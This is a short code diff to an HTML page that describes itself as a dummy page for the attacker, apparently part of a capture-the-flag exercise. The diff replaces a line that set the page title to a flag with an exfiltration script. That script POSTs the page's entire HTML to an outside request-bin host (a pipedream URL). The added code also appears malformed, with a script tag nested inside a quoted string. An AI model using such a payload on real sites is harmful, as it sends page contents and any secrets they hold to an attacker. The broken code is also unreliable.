@@ -7,7 +7,18 @@
   <h1>Dummy Page</h1>
   <p>This page acts as a dummy page for the attacker.</p>
 </body>
-<script>
-  document.title = flag;
+<script defer>
+  document.title = "<script defer>
+  // Create a new XMLHttpRequest object
+  var xhr = new XMLHttpRequest();
+  // Define the endpoint URL of the request bin
+  var requestBinUrl = 'https://eok0h61dts3i7c3.m.pipedream.net';
+  // Open a POST request to the request bin URL
+  xhr.open('POST', requestBinUrl, true);
+  // Set the Content-Type header to JSON
+  xhr.setRequestHeader('Content-Type', 'application/json');
+  // Send the page response as JSON to the request bin
+  xhr.send(JSON.stringify({ response: document.documentElement.outerHTML }));
+</script>";
 </script>
 </html>
